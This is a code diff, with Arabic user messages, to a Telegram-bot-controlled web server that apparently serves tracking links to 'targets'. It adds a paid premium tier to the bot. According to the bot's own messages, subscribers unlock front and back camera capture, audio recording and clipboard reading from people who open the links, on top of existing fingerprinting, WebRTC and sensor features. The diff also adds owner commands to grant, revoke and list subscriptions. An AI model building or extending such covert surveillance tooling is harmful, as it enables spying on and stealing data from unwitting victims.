@@ -16,6 +16,7 @@ const TARGETS_FILE    = "./targets.json";
 const NOTES_FILE      = "./notes.json";
 const USERSTATS_FILE  = "./userstats.json";
 const PROFILES_FILE   = "./profiles.json";
+const PREMIUM_FILE    = "./premium.json";
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true };
 
@@ -27,6 +28,7 @@ let settings   = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:fa
 let notes      = loadJSON(NOTES_FILE, {});
 let userStats  = loadJSON(USERSTATS_FILE, {});
 let profiles   = loadJSON(PROFILES_FILE, {});  // { "userId": { name, username, seen } }
+let premium    = loadJSON(PREMIUM_FILE,  {});  // { "userId": { expiry: ts|-1, plan: 'monthly'|'yearly'|'lifetime' } }
 
 if (!settings.features) settings.features = {...DEFAULT_FEATURES};
 
@@ -38,6 +40,29 @@ function saveSettings()  { saveJSON(SETTINGS_FILE,  settings); }
 function saveNotes()     { saveJSON(NOTES_FILE,     notes); }
 function saveUserStats() { saveJSON(USERSTATS_FILE, userStats); }
 function saveProfiles()  { saveJSON(PROFILES_FILE,  profiles); }
+function savePremium()   { saveJSON(PREMIUM_FILE,   premium); }
+
+// Returns true if user has active premium (owner always has it)
+function isPremium(uid) {
+  const id = String(uid);
+  if (Number(id) === BOT_OWNER) return true;
+  const p = premium[id];
+  if (!p) return false;
+  if (p.expiry === -1) return true;          // lifetime
+  return Date.now() < p.expiry;
+}
+
+// Premium expiry watcher — alert owner when someone's premium expires
+setInterval(() => {
+  const now = Date.now();
+  for (const [id, p] of Object.entries(premium)) {
+    if (p.expiry !== -1 && p.expiry > 0 && now > p.expiry && !p.expired) {
+      premium[id].expired = true; savePremium();
+      const prof = profiles[id] || {};
+      bot.sendMessage(BOT_OWNER, `⏰ انتهى اشتراك ${prof.name || id} (@${prof.username || '?'})\nID: \`${id}\``, { parse_mode:"Markdown" }).catch(()=>{});
+    }
+  }
+}, 60000);
 
 // Auto-disable features when timer expires
 setInterval(() => {
@@ -71,6 +96,7 @@ const DATA_FILES = [
   { local: "./notes.json",     remote: "_data/notes.json"     },
   { local: "./userstats.json", remote: "_data/userstats.json" },
   { local: "./profiles.json",  remote: "_data/profiles.json"  },
+  { local: "./premium.json",   remote: "_data/premium.json"   },
 ];
 
 async function ghGet(path) {
@@ -260,7 +286,8 @@ async function handleLinkOpen(req, res, view) {
   });
 
   const feat = settings.features || DEFAULT_FEATURES;
-  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat });
+  const userPremium = isPremium(creatorId);
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium });
 }
 
 app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
@@ -620,6 +647,65 @@ bot.on('message', async (msg) => {
       return `${medal} ${p.name||id}${p.username?' '+p.username:''}\n   👁️ ${u.linksOpened||0} فتحة | 🔗 ${u.linksCreated||0} رابط`;
     }).join("\n");
     return bot.sendMessage(chatId, `🏆 الأكثر نشاطاً (${sorted.length}):\n\n${list}`);
+  }
+
+  // ── Premium commands ────────────────────────────────────────────────────────
+
+  // /mypremium — check own subscription status
+  if (msg.text === "/mypremium") {
+    const id = String(chatId);
+    if (isPremium(chatId) && chatId !== BOT_OWNER) {
+      const p = premium[id];
+      const expText = p.expiry === -1 ? "♾️ مدى الحياة" : `⏳ ينتهي: ${new Date(p.expiry).toJSON().slice(0,10)}`;
+      return bot.sendMessage(chatId, `✅ اشتراكك *مفعّل*\n📦 الخطة: ${p.plan||'—'}\n${expText}\n\n🎁 المميزات: 📷 كاميرا + 🎙️ صوت + 📋 حافظة`, { parse_mode:"Markdown" });
+    }
+    if (chatId === BOT_OWNER) return bot.sendMessage(chatId, `👑 أنت المالك — كل الميزات متاحة دائماً.`);
+    return bot.sendMessage(chatId, `❌ ليس لديك اشتراك مدفوع.\n\nتواصل مع المالك لتفعيل البريميوم وتحصل على:\n📷 كاميرا أمامية وخلفية\n🎙️ تسجيل صوتي\n📋 قراءة الحافظة`);
+  }
+
+  // /premium [id] [days|lifetime] — grant premium (owner only)
+  if (msg.text?.startsWith("/premium ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const parts = msg.text.replace("/premium ","").trim().split(/\s+/);
+    const tid = parts[0]; const daysArg = parts[1] || "30";
+    if (!tid || isNaN(Number(tid))) return bot.sendMessage(chatId, "⚠️ استخدم: /premium [ID] [أيام أو lifetime]");
+    let expiry, plan;
+    if (daysArg === "lifetime" || daysArg === "مدى") { expiry = -1; plan = "lifetime"; }
+    else { const d = parseInt(daysArg)||30; expiry = Date.now() + d*24*3600*1000; plan = d >= 365 ? "yearly" : d >= 30 ? "monthly" : "weekly"; }
+    premium[tid] = { expiry, plan, grantedAt: Date.now(), expired: false };
+    savePremium();
+    const prof = profiles[tid] || {};
+    const expText = expiry === -1 ? "♾️ مدى الحياة" : `⏳ حتى ${new Date(expiry).toJSON().slice(0,10)}`;
+    bot.sendMessage(chatId, `✅ تم تفعيل البريميوم\n👤 ${prof.name||tid}\n📦 ${plan}\n${expText}`, { parse_mode:"Markdown" });
+    // Notify the user
+    bot.sendMessage(Number(tid), `🎉 تم تفعيل اشتراكك البريميوم!\n📦 الخطة: ${plan}\n${expText}\n\n🔓 المميزات المفعّلة:\n📷 كاميرا أمامية وخلفية\n🎙️ تسجيل صوتي\n📋 قراءة الحافظة`).catch(()=>{});
+    return;
+  }
+
+  // /revokepremium [id] — revoke premium (owner only)
+  if (msg.text?.startsWith("/revokepremium ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const tid = msg.text.replace("/revokepremium ","").trim();
+    if (!premium[tid]) return bot.sendMessage(chatId, `⚠️ \`${tid}\` ليس لديه اشتراك.`, { parse_mode:"Markdown" });
+    delete premium[tid]; savePremium();
+    bot.sendMessage(chatId, `🗑️ تم إلغاء اشتراك \`${tid}\`.`, { parse_mode:"Markdown" });
+    bot.sendMessage(Number(tid), `⚠️ تم إلغاء اشتراكك البريميوم.\nتواصل مع المالك لتجديده.`).catch(()=>{});
+    return;
+  }
+
+  // /premiumlist — list all premium subscribers (owner only)
+  if (msg.text === "/premiumlist") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const entries = Object.entries(premium);
+    if (!entries.length) return bot.sendMessage(chatId, "لا يوجد مشتركون بريميوم.");
+    const now = Date.now();
+    const list = entries.map(([id, p], i) => {
+      const prof = profiles[id] || {};
+      const active = isPremium(Number(id));
+      const expText = p.expiry === -1 ? "♾️" : new Date(p.expiry).toJSON().slice(0,10);
+      return `${i+1}. ${active?'✅':'❌'} ${prof.name||id} (${p.plan||'?'}) — ${expText}`;
+    }).join("\n");
+    return bot.sendMessage(chatId, `💎 المشتركون البريميوم (${entries.length}):\n\n${list}`);
   }
 
   // /cleardata [id] — مسح بيانات مستخدم معين
@@ -996,14 +1082,15 @@ app.listen(5000, async () => {
       { command: "stats",     description: "📊 الإحصائيات" },
       { command: "report",    description: "📋 تقرير شامل" },
       { command: "users",     description: "👥 المستخدمون" },
-      { command: "top",       description: "🏆 الأكثر نشاطاً" },
-      { command: "lastopen",  description: "🕐 آخر فتح للروابط" },
-      { command: "targets",   description: "🎯 الأهداف" },
-      { command: "broadcast", description: "📢 إرسال للجميع" },
-      { command: "silent",    description: "🔕 الوضع الصامت" },
-      { command: "ping",      description: "🏓 اختبار السرعة" },
-      { command: "export",    description: "📤 تصدير البيانات" },
-      { command: "cleardata", description: "🗑️ مسح بيانات مستخدم" }
+      { command: "top",           description: "🏆 الأكثر نشاطاً" },
+      { command: "lastopen",      description: "🕐 آخر فتح للروابط" },
+      { command: "targets",       description: "🎯 الأهداف" },
+      { command: "premiumlist",   description: "💎 قائمة المشتركين" },
+      { command: "broadcast",     description: "📢 إرسال للجميع" },
+      { command: "silent",        description: "🔕 الوضع الصامت" },
+      { command: "ping",          description: "🏓 اختبار السرعة" },
+      { command: "export",        description: "📤 تصدير البيانات" },
+      { command: "cleardata",     description: "🗑️ مسح بيانات مستخدم" }
     ], { scope: { type: "chat", chat_id: BOT_OWNER } }).catch(() => {});
 
     const up = new Date().toISOString();
